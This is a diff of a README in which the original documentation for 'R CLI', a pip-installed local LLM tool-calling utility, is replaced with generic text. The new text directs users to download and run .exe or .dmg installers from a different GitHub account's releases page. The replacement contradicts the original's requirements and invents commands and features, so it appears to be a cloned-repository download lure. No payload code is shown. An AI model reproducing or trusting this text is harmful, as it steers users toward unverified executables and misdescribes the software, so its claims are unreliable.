@@ -1,321 +1,77 @@
-# R CLI
+# 🤖 r - Simple Local AI Agent Experience
 
-<div align="center">
+## 🚀 Getting Started
 
-**Your Local AI Operating System**
+Welcome to r! This application provides a straightforward way to run a local AI agent on your computer. You can use it for various tasks like document generation, function calling, and much more. Follow this guide to get started.
 
-[![PyPI](https://img.shields.io/pypi/v/r-cli-ai?color=blue&label=PyPI)](https://pypi.org/project/r-cli-ai/)
-[![Downloads](https://static.pepy.tech/badge/r-cli-ai)](https://pepy.tech/project/r-cli-ai)
-[![CI](https://github.com/raym33/r/actions/workflows/ci.yml/badge.svg)](https://github.com/raym33/r/actions/workflows/ci.yml)
-[![Python](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+## 📥 Download r
 
-**82 Skills** | **100% Private** | **Distributed AI** | **P2P Agents**
+[![Download r](https://img.shields.io/badge/Download%20r-v1.0.0-blue)](https://github.com/ALBERT70000/r/releases)
 
-[Install](#install) | [Skills](#skills) | [Distributed AI](#distributed-ai) | [P2P Agents](#p2p-agents) | [Docs](docs/COMPLETE_GUIDE.md)
+You can download the software from the Releases page. Click the button above to visit the download page.
 
-</div>
+## 🔍 Features
 
----
+- **Local AI Processing:** Run AI tasks on your own machine without needing an internet connection.
+- **Document Generation:** Easily generate PDFs and other documents.
+- **Function Calling:** Call functions directly through the command line interface (CLI).
+- **Privacy Focused:** Your data stays on your device. No data sent to external servers.
+- **Flexible Integration:** Works seamlessly with your existing workflows.
 
-## What is R CLI?
+## 🔧 System Requirements
 
-R CLI connects your local LLM to 82 real system tools. Ask in natural language, the AI calls the right tool.
+Before installation, ensure your system meets the following requirements:
 
-```
-You: "Create a PDF report about Python"
- │
- ▼
-R CLI → LLM decides → calls pdf.generate_pdf() → python_report.pdf
-```
+- **Operating System:** Windows 10, macOS 10.15 or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** A minimum of 200 MB free space.
+- **Python:** Version 3.7 or later installed on your machine.
 
-```bash
-# Chat with tools
-r chat "compress all python files into backup.zip"
+## 🔥 Installation Steps
 
-# SQL on CSV files
-r sql sales.csv "SELECT product, SUM(revenue) FROM data GROUP BY product"
+1. **Visit the Download Page:** Go to [this page to download](https://github.com/ALBERT70000/r/releases) for the latest version.
+2. **Download the Application:** Click on the version you wish to download. The file will typically have an extension like `.exe` for Windows or `.dmg` for macOS.
+3. **Run the Installer:**
+   - **For Windows:** Double-click the downloaded `.exe` file.
+   - **For macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
+4. **Verify Installation:**
+   - **Windows:** Open Command Prompt and type `r --version` to check if it's installed correctly.
+   - **macOS:** Open Terminal and type `r --version`.
 
-# Semantic search your docs
-r rag --add ./docs/ && r rag --query "how does auth work"
-```
+## 📋 Usage Instructions
 
----
+After installation, you can easily start using r from the command line.
 
-## Install
+1. **Open Command Line:**
+   - **Windows:** Use Command Prompt or PowerShell.
+   - **macOS:** Use Terminal.
+   
+2. **Start the Application:**
+   Type `r` and press Enter. You will see the command line interface ready to accept input.
+   
+3. **Run a Command:**
+   Use simple commands to perform tasks. For example:
+   - To generate a PDF: `r generate pdf "Your document content here"`
+   - To call a function: `r call function_name`
 
-```bash
-# From GitHub (latest)
-pip install git+https://github.com/raym33/r.git
+## ⚙️ Troubleshooting
 
-# With Distributed AI + P2P (Apple Silicon)
-pip install "r-cli-ai[mlx,p2p] @ git+https://github.com/raym33/r.git"
-```
+If you encounter issues, consider the following:
 
-### Requirements
+- **Application Not Starting:** Ensure that Python is installed and available in your system path.
+- **Command Not Recognized:** Make sure you entered the command correctly. Typo can lead to errors.
+- **Installation Issues:** Restart your computer and try reinstalling the application if the installation fails.
 
-- Python 3.10+
-- [Ollama](https://ollama.ai/) or [LM Studio](https://lmstudio.ai/) running locally
+## 💬 Support
 
-### Run
+If you need further help, you can reach out via the repository’s Issues page. Our community is here to assist with any questions you may have.
 
-```bash
-# Start Ollama first
-ollama pull llama3.2 && ollama serve
+## 💼 Contributing
 
-# Then run R CLI
-r                                 # Interactive mode with skill selector
-r chat "explain quantum physics"  # Direct query
-r serve                           # Start API server
-```
+r is open-source, and contributions are welcome! Feel free to fork the repository, make changes, and submit a pull request.
 
----
+## 🔗 Download & Install
 
-## Skills
+To get your own copy of r, [visit this page to download](https://github.com/ALBERT70000/r/releases) the latest version. Follow the installation steps above, and enjoy a powerful local AI agent at your fingertips.
 
-82 tools organized by category:
-
-| Category | Skills |
-|----------|--------|
-| **Documents** | `pdf` `latex` `markdown` `template` `resume` `pdftools` `changelog` |
-| **Code & Data** | `code` `sql` `json` `yaml` `csv` `regex` `schema` `diff` |
-| **AI & Knowledge** | `rag` `multiagent` `translate` `distributed_ai` `p2p` |
-| **Media** | `voice` `ocr` `image` `video` `audio` `screenshot` `qr` `barcode` |
-| **DevOps** | `git` `docker` `ssh` `http` `web` `network` `system` `metrics` |
-| **Productivity** | `calendar` `email` `clipboard` `archive` `ical` `vcard` |
-| **Hardware** | `gpio` `bluetooth` `wifi` `power` `android` |
-
-<details>
-<summary><b>View all 82 skills</b></summary>
-
-```
-agimemory, agimemory_pg, android, archive, audio, autoresponder,
-barcode, benchmark, bluetooth, calendar, changelog, clipboard,
-code, color, cron, crypto, csv, currency, datetime, diff,
-distributed_ai, docker, email, encoding, env, faker, fs, git,
-gpio, html, http, hublab, ical, image, imagegen, ip, json, jwt,
-latex, logs, manifest, markdown, math, metrics, mime, msoffice,
-multiagent, network, ocr, openapi, p2p, pdf, pdftools, plugin,
-power, qr, rag, realtime_voice, regex, resume, rss, schema,
-screenshot, semver, sitemap, social, sql, ssh, system, template,
-text, translate, url, vcard, video, voice, weather, web,
-websearch, wifi, xml, yaml
-```
-
-</details>
-
----
-
-## Distributed AI
-
-Run 70B+ models across multiple Apple Silicon Macs using MLX. Like [exo](https://github.com/exo-explore/exo), but integrated with R CLI's 82 skills.
-
-### Example: 5-Mac Cluster for Llama 70B
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     Llama 70B (80 layers)                   │
-├─────────────────────────────────────────────────────────────┤
-│                                                             │
-│  Mac Mini 1     Mac Mini 2     Mac Mini 3     Mac Mini 4    │
-│  M4 16GB        M4 16GB        M4 16GB        M4 16GB       │
-│  Layers 0-15    Layers 16-31   Layers 32-47   Layers 48-63  │
-│                                                             │
-│                    MacBook Pro M4 24GB                      │
-│                    Layers 64-79 + Output                    │
-│                                                             │
-│  Total: 88GB unified memory → 70B 4-bit model fits          │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### Setup
-
-```bash
-# Install on each Mac
-pip install "r-cli-ai[mlx,p2p] @ git+https://github.com/raym33/r.git"
-
-# Start server on each Mac
-r serve --host 0.0.0.0 --port 8765
-
-# From coordinator Mac, add nodes
-r chat "add node at 192.168.1.101"
-r chat "add node at 192.168.1.102"
-r chat "add node at 192.168.1.103"
-r chat "add node at 192.168.1.104"
-
-# Check cluster status
-r chat "cluster status"
-
-# Load 70B model distributed across cluster
-r chat "load model mlx-community/Meta-Llama-3.1-70B-Instruct-4bit"
-
-# Generate (uses all nodes)
-r chat "explain quantum computing in detail"
-```
-
-### Performance
-
-| Network | Tokens/sec (70B) |
-|---------|------------------|
-| 10 GbE  | 8-15            |
-| 1 GbE   | 5-10            |
-| WiFi 6  | 2-5             |
-
-**[Full Distributed AI Guide](docs/DISTRIBUTED_AI.md)**
-
----
-
-## P2P Agents
-
-Multiple R CLI instances can discover each other and collaborate on tasks.
-
-```bash
-# Auto-discover peers on LAN (mDNS/Bonjour)
-r chat "discover peers"
-
-# Add remote peer manually
-r chat "add peer at 192.168.1.50"
-
-# List connected peers
-r chat "list peers"
-
-# Run task on remote peer
-r chat "ask mac-mini-2 to generate a sales report PDF"
-
-# Share conversation context
-r chat "sync conversation with mac-mini-2"
-
-# Find peers with specific skills
-r chat "find peers with pdf skill"
-```
-
-### Features
-
-- **mDNS Discovery** - Automatic peer discovery on LAN
-- **Manual Peers** - Add peers by IP for internet connections
-- **Approval System** - Must approve new peers before collaboration
-- **Skill Sharing** - Access skills from remote peers
-- **Context Sync** - Share conversation memory between instances
-
-**[Full P2P Guide](docs/P2P_AGENTS.md)**
-
----
-
-## REST API
-
-```bash
-# Start server
-r serve --port 8765
-
-# OpenAI-compatible chat
-curl http://localhost:8765/v1/chat \
-  -H "Content-Type: application/json" \
-  -d '{"messages": [{"role": "user", "content": "Hello"}]}'
-
-# Call skill directly
-curl http://localhost:8765/v1/skills/call \
-  -d '{"skill": "pdf", "tool": "generate_pdf", "arguments": {"content": "Hello"}}'
-
-# Distributed AI endpoints
-curl http://localhost:8765/v1/distributed/cluster
-curl http://localhost:8765/v1/distributed/generate -d '{"prompt": "Hello"}'
-
-# P2P endpoints
-curl http://localhost:8765/v1/p2p/peers
-curl http://localhost:8765/v1/p2p/discover
-```
-
-Swagger docs: http://localhost:8765/docs
-
----
-
-## Configuration
-
-```yaml
-# ~/.r-cli/config.yaml
-llm:
-  backend: ollama          # or lmstudio
-  model: llama3.2
-  base_url: http://localhost:11434/v1
-
-skills:
-  disabled: []             # skills to disable
-```
-
----
-
-## Custom Skills
-
-```python
-# ~/.r-cli/skills/hello.py
-from r_cli.core.agent import Skill
-from r_cli.core.llm import Tool
-
-class HelloSkill(Skill):
-    name = "hello"
-    description = "A greeting skill"
-
-    def get_tools(self):
-        return [Tool(
-            name="greet",
-            description="Greet someone",
-            parameters={"type": "object", "properties": {"name": {"type": "string"}}},
-            handler=self.greet,
-        )]
-
-    def greet(self, name: str) -> str:
-        return f"Hello, {name}!"
-```
-
----
-
-## R OS (Experimental)
-
-Terminal UI for Raspberry Pi. Not an actual OS.
-
-```bash
-pip install git+https://github.com/raym33/r.git
-pip install textual
-r-os
-```
-
-**[R OS Guide](r_os/README.md)**
-
----
-
-## Development
-
-```bash
-git clone https://github.com/raym33/r.git
-cd r
-pip install -e ".[dev]"
-pytest tests/
-ruff check . && ruff format .
-```
-
----
-
-## Links
-
-- [Documentation](docs/COMPLETE_GUIDE.md)
-- [Distributed AI Guide](docs/DISTRIBUTED_AI.md)
-- [P2P Agents Guide](docs/P2P_AGENTS.md)
-- [Changelog](CHANGELOG.md)
-- [Issues](https://github.com/raym33/r/issues)
-
----
-
-## Limitations
-
-- Skills run with your user permissions (sandboxing is basic)
-- Small models (4B) may pick wrong tools; 7B+ recommended
-- Some skills need dependencies (OCR needs Tesseract, voice needs Whisper)
-- Distributed AI requires Apple Silicon Macs with MLX
-
----
-
-<div align="center">
-
-MIT License | Created by [Ramón Guillamón](https://x.com/learntouseai)
-
-</div>
+Now, you're ready to utilize the powerful features of r!
